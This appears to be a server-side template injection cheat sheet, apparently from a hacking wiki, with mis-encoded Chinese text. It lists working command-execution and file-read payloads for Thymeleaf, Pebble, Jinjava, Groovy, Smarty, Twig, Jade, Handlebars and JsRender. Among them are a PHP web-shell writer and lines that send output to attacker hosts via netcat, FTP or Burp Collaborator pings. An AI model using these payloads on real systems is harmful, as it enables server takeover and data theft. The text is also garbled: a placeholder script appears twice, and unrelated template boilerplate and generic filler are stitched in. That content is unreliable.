${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* ç”¨äºç”Ÿæˆpayloadçš„è‡ªå®šä¹‰è„šæœ¬

```python
import requests

def generate_payload(template, command):
    payload = template.replace("{{command}}", command)
    return payload

def send_payload(url, payload):
    response = requests.post(url, data=payload)
    return response.text

template = """
{{command}}
"""

command = "ls -la"
url = "http://example.com"
payload = generate_payload(template, command)
response = send_payload(url, payload)
print(response)
```

ä½¿ç”¨è‡ªå®šä¹‰è„šæœ¬ç”Ÿæˆpayloadçš„æ–¹æ³•å¦‚ä¸‹ï¼š

```python
import requests

def generate_payload(template, command):
    payload = template.replace("{{command}}", command)
    return payload

def send_payload(url, payload):
    response = requests.post(url, data=payload)
    return response.text

template = """
{{command}}
"""

command = "ls -la"
url = "http://example.com"
payload = generate_payload(template, command)
response = send_payload(url, payload)
print(response)
```
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**æ›´å¤šä¿¡æ¯**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Springè§†å›¾æ“çºµï¼ˆJavaï¼‰
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebbleï¼ˆJavaï¼‰

* `{{ someString.toUPPERCASE() }}`

Pebbleçš„æ—§ç‰ˆæœ¬ï¼ˆ< 3.0.9ï¼‰ï¼š
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
Pebbleçš„æ–°ç‰ˆæœ¬ï¼š
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjavaï¼ˆJavaï¼‰

Jinjava is a Java-based template engine that allows for server-side template injection (SSTI) attacks. It is commonly used in web applications built with Java frameworks such as Spring Boot.

#### Exploiting Jinjava SSTI

To exploit Jinjava SSTI, you need to identify the injection point in the application where user-supplied input is directly included in the template. This can typically be found in places where the application dynamically generates HTML or other types of documents.

Once you have identified the injection point, you can craft a payload that will be executed as Jinjava code. This payload can include Jinjava expressions, filters, and functions to manipulate the template and execute arbitrary code on the server.

#### Payload Examples

Here are some examples of payloads that can be used to exploit Jinjava SSTI:

1. **Basic Payload**: `${7*7}` - This payload will execute the expression `7*7` and return the result (`49`).

2. **Command Execution**: `${"".getClass().forName("java.lang.Runtime").getRuntime().exec("ls")}` - This payload will execute the `ls` command on the server and return the output.

3. **File Read**: `${"".getClass().forName("java.nio.file.Files").readAllBytes(java.nio.file.Paths.get("/etc/passwd"))}` - This payload will read the contents of the `/etc/passwd` file on the server and return them.

#### Mitigation

To mitigate Jinjava SSTI attacks, it is important to properly validate and sanitize user input before including it in templates. Input validation should include checking for malicious characters and patterns that could be used to inject Jinjava code.

Additionally, it is recommended to use a secure template engine that has built-in protection against SSTI attacks.
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
Jinjavaæ˜¯ç”±Hubspotå¼€å‘çš„å¼€æºé¡¹ç›®ï¼Œå¯åœ¨[https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)ä¸Šæ‰¾åˆ°ã€‚

**Jinjava - å‘½ä»¤æ‰§è¡Œ**

ä¿®å¤é“¾æ¥ï¼š[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**æ›´å¤šä¿¡æ¯**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` è¯­å¥åˆ†éš”ç¬¦
* `{{ }}` è¡¨è¾¾å¼åˆ†éš”ç¬¦
* `{# #}` æ³¨é‡Šåˆ†éš”ç¬¦
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

æœç´¢ "com.hubspot.content.hubl.context.TemplateContextRequest" å¹¶å‘ç°äº† [Jinjava é¡¹ç›®åœ¨ Github ä¸Šçš„é“¾æ¥](https://github.com/HubSpot/jinjava/)ã€‚
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the







{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**æ›´å¤šä¿¡æ¯**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### è¡¨è¾¾å¼è¯­è¨€ - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

ELä¸ºå¯ç”¨è¡¨ç¤ºå±‚ï¼ˆç½‘é¡µï¼‰ä¸åº”ç”¨é€»è¾‘ï¼ˆæ‰˜ç®¡çš„beanï¼‰ä¹‹é—´çš„é€šä¿¡æä¾›äº†é‡è¦æœºåˆ¶ã€‚ELè¢«**å¤šä¸ªJavaEEæŠ€æœ¯**ä½¿ç”¨ï¼Œä¾‹å¦‚JavaServer FacesæŠ€æœ¯ã€JavaServer Pagesï¼ˆJSPï¼‰æŠ€æœ¯å’ŒJava EEçš„ä¸Šä¸‹æ–‡å’Œä¾èµ–æ³¨å…¥ï¼ˆCDIï¼‰ã€‚\
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£æ›´å¤šå…³äº**åˆ©ç”¨ELè§£é‡Šå™¨çš„æ¼æ´åˆ©ç”¨**çš„ä¿¡æ¯ï¼š

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

æ­¤å®‰å…¨ç®¡ç†å™¨ç»•è¿‡æ–¹æ³•æ¥è‡ªäºè¿™ä¸ª[**è§£æ**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ã€‚
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹èšä¼šã€‚

{% embed url="https://www.rootedcon.com/" %}

##

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**æ›´å¤šä¿¡æ¯**

* åœ¨[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)çš„Smartyéƒ¨åˆ†
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - æ¨¡æ¿æ ¼å¼**

Twig is a popular template engine used in many web applications, including the Symfony framework. It provides a flexible and secure way to render dynamic content in templates.

Twig templates are written in a syntax that is similar to HTML, but with additional features and tags specific to Twig. These features include variables, filters, functions, control structures, and template inheritance.

Variables in Twig are enclosed in double curly braces, like `{{ variable }}`. They can hold any type of data, such as strings, numbers, arrays, or objects. Variables can be accessed and manipulated using filters and functions.

Filters in Twig are used to modify the output of variables. They are applied using the pipe character (`|`) followed by the filter name and any additional arguments. For example, `{{ variable | filter(argument) }}`.

Functions in Twig are similar to filters, but they are used to perform more complex operations. They are called using the function name followed by parentheses and any arguments. For example, `{{ function(argument) }}`.

Control structures in Twig allow you to perform conditional and iterative operations. These include `if` statements, `for` loops, and `foreach` loops. They are written using special tags, such as `{% if condition %}...{% endif %}`.

Template inheritance in Twig allows you to create a base template that can be extended by other templates. This is useful for reusing common elements across multiple pages. The base template defines blocks that can be overridden in the child templates.

Overall, Twig provides a powerful and secure way to create dynamic templates in web applications. However, it is important to be aware of the potential security risks associated with server-side template injection (SSTI) vulnerabilities, which can allow an attacker to execute arbitrary code on the server.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**æ›´å¤šä¿¡æ¯**

* åœ¨[Twigå’ŒTwigï¼ˆæ²™ç›’ï¼‰](https://portswigger.net/research/server-side-template-injection)éƒ¨åˆ†
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Platesï¼ˆPHPï¼‰

Plateså—åˆ°Twigçš„å¯å‘ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªåŸç”Ÿçš„PHPæ¨¡æ¿å¼•æ“ï¼Œè€Œä¸æ˜¯ç¼–è¯‘æ¨¡æ¿å¼•æ“ã€‚

æ§åˆ¶å™¨ï¼š
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
é¡µé¢æ¨¡æ¿ï¼š

```html
<!DOCTYPE html>
<html>
<head>
    <title>My Website</title>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>This is a sample page template.</p>
    <p>Feel free to customize it as per your needs.</p>
</body>
</html>
```

The above code represents a basic page template for a website. It includes the HTML structure with a title, heading, and paragraphs. You can modify this template according to your requirements.
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
å¸ƒå±€æ¨¡æ¿ï¼š

```html
<!DOCTYPE html>
<html>
<head>
    <title>Page Title</title>
</head>
<body>
    <h1>Welcome to my website!</h1>
    <div>
        <!-- Content goes here -->
    </div>
    <footer>
        <p>Â© 2022 My Website. All rights reserved.</p>
    </footer>
</body>
</html>
```

æ¨¡æ¿å¸ƒå±€ï¼š

```html
<!DOCTYPE html>
<html>
<head>
    <title>é¡µé¢æ ‡é¢˜</title>
</head>
<body>
    <h1>æ¬¢è¿è®¿é—®æˆ‘çš„ç½‘ç«™ï¼</h1>
    <div>
        <!-- å†…å®¹æ”¾åœ¨è¿™é‡Œ -->
    </div>
    <footer>
        <p>Â© 2022 æˆ‘çš„ç½‘ç«™ã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚</p>
    </footer>
</body>
</html>
```
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlibå’ŒHTML\_Template\_PHPLIBï¼ˆPHPï¼‰

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)ä¸PHPlibç›¸åŒï¼Œä½†å·²ç§»æ¤åˆ°Pearã€‚

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection)

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template, which is then executed by the server. This can lead to remote code execution (RCE) and other serious security issues.

## Exploiting SSTI in `authors.php`

In the `authors.php` file, there may be a vulnerability that allows for SSTI. This vulnerability can be exploited by injecting malicious code into the server-side template.

To exploit this vulnerability, follow these steps:

1. Identify the injection point: Look for user-controlled input that is directly used in the template engine. This can include variables, function calls, or other template constructs.

2. Craft the payload: Create a payload that will execute arbitrary code on the server. This can be done by injecting code that will be executed by the template engine.

3. Test the payload: Inject the payload into the vulnerable input and observe the server's response. If the payload is executed and the server's response includes the expected output, then the vulnerability has been successfully exploited.

4. Exploit the vulnerability: Once the vulnerability has been confirmed, the attacker can proceed to exploit it further. This can include executing arbitrary commands, accessing sensitive information, or even gaining remote access to the server.

## Prevention and Mitigation

To prevent SSTI vulnerabilities, it is important to follow secure coding practices:

- Input validation and sanitization: Always validate and sanitize user input before using it in a template engine. This can help prevent malicious code from being injected.

- Use a secure template engine: Choose a template engine that has built-in security features, such as automatic escaping of user input. This can help mitigate the impact of SSTI vulnerabilities.

- Keep software up to date: Regularly update the software and libraries used in your application to ensure that any known vulnerabilities are patched.

- Implement strict access controls: Limit the privileges of the server-side template engine to minimize the potential impact of an SSTI vulnerability.

By following these best practices, you can reduce the risk of SSTI vulnerabilities and protect your application from potential attacks.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jadeï¼ˆNodeJSï¼‰

Jadeæ˜¯ä¸€ä¸ªåŸºäºNodeJSçš„æ¨¡æ¿å¼•æ“ï¼Œç”¨äºç”ŸæˆHTMLã€‚å®ƒä½¿ç”¨ç®€æ´çš„è¯­æ³•å’Œç¼©è¿›æ¥åˆ›å»ºæ¨¡æ¿ï¼Œç„¶åå°†å…¶ç¼–è¯‘ä¸ºHTMLã€‚Jadeæ¨¡æ¿å¯ä»¥åŒ…å«åŠ¨æ€å†…å®¹å’Œè¡¨è¾¾å¼ï¼Œä½¿å…¶å…·æœ‰å¼ºå¤§çš„çµæ´»æ€§ã€‚

#### æ£€æµ‹SSTIæ¼æ´

è¦æ£€æµ‹Jadeæ¨¡æ¿ä¸­çš„SSTIæ¼æ´ï¼Œå¯ä»¥å°è¯•åœ¨æ¨¡æ¿ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„æ³¨å…¥ç‚¹ï¼š

- å±æ€§å€¼ï¼šå°è¯•åœ¨å±æ€§å€¼ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚`<img src="x" onerror="alert('XSS')">`ã€‚
- æ–‡æœ¬å†…å®¹ï¼šå°è¯•åœ¨æ–‡æœ¬å†…å®¹ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚`<script>alert('XSS')</script>`ã€‚
- è¡¨è¾¾å¼ï¼šå°è¯•åœ¨è¡¨è¾¾å¼ä¸­æ’å…¥æ¶æ„ä»£ç ï¼Œä¾‹å¦‚`#{7*7}`ã€‚

#### é˜²å¾¡æªæ–½

è¦é˜²æ­¢SSTIæ¼æ´ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤ï¼Œç¡®ä¿åªæ¥å—é¢„æœŸçš„è¾“å…¥ã€‚
- æ¨¡æ¿æ²™ç›’åŒ–ï¼šå°†æ¨¡æ¿å¼•æ“é…ç½®ä¸ºè¿è¡Œåœ¨æ²™ç›’ç¯å¢ƒä¸­ï¼Œé™åˆ¶å…¶è®¿é—®æ•æ„Ÿèµ„æºã€‚
- æ¨¡æ¿ç™½åå•ï¼šé™åˆ¶å¯ç”¨çš„æ¨¡æ¿æ ‡ç­¾å’Œå‡½æ•°ï¼Œåªå…è®¸ä½¿ç”¨å®‰å…¨çš„é€‰é¡¹ã€‚
- è¾“å…¥ç¼–ç ï¼šå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œé€‚å½“çš„ç¼–ç ï¼Œä»¥é˜²æ­¢æ³¨å…¥æ”»å‡»ã€‚

#### æ¼æ´åˆ©ç”¨

å¦‚æœæˆåŠŸåˆ©ç”¨äº†SSTIæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼ŒåŒ…æ‹¬è¯»å–æ•æ„Ÿæ•°æ®ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ã€‚å› æ­¤ï¼ŒåŠæ—¶ä¿®å¤å’Œé˜²æ­¢SSTIæ¼æ´éå¸¸é‡è¦ã€‚
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**æ›´å¤šä¿¡æ¯**

* åœ¨Jadeéƒ¨åˆ†çš„[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) æ˜¯ä¸€ä¸ªéç¼–è¯‘çš„PHPæ¨¡æ¿å¼•æ“ï¼Œä½¿ç”¨XMLæ ‡ç­¾å°†æ–‡æ¡£åˆ†æˆä¸åŒçš„éƒ¨åˆ†ã€‚
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

è·¯å¾„éå†ï¼ˆæ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)ï¼‰ã€‚
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= é”™è¯¯
* ${7\*7} = ${7\*7}
* æ— 
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**æ›´å¤šä¿¡æ¯**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRenderï¼ˆNodeJSï¼‰

| **æ¨¡æ¿** | **æè¿°**                                 |
| -------- | ---------------------------------------- |
|          | è¯„ä¼°å’Œæ¸²æŸ“è¾“å‡º                          |
|          | è¯„ä¼°å’Œæ¸²æŸ“HTMLç¼–ç çš„è¾“å‡º                |
|          | æ³¨é‡Š                                     |
| å’Œ       | å…è®¸ä»£ç ï¼ˆé»˜è®¤ç¦ç”¨ï¼‰                     |

* \= 49

**å®¢æˆ·ç«¯**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**æœåŠ¡å™¨ç«¯**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**æ›´å¤šä¿¡æ¯**

